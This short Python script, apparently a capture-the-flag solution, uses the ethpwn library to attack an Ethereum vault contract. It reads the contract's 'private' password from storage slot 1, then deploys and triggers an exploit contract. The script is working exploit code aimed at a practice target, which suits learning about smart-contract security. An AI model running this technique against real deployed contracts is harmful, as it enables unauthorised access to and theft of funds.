#!/usr/bin/env python3

import sys
from ethpwn import *
from time import sleep

import argparse


parser = argparse.ArgumentParser()
parser.add_argument('proxy_addr', type=str)
parser.add_argument('--wallet', type=str, default='Laptop CTF Metamask', help="Wallet to use for the exploit transaction")
ARGS = parser.parse_args()

context.log_level = 'DEBUG'

MY_WALLET = get_wallet(ARGS.wallet)
assert MY_WALLET is not None
context.default_from_addr = MY_WALLET.address
context.default_signing_key = MY_WALLET.private_key

CONTRACT_METADATA.add_contracts_from_solidity_files(['./exploit_vault.sol'])

password = context.w3.eth.get_storage_at(ARGS.proxy_addr, 1)
print(password)

with CONTRACT_METADATA['Exploit'].deploy_destructible(ARGS.proxy_addr, password) as (tx_hash, target):
    print(f"Exploit contract is at {target.address}")
    sleep(2)

    transact(target.functions.exploit())
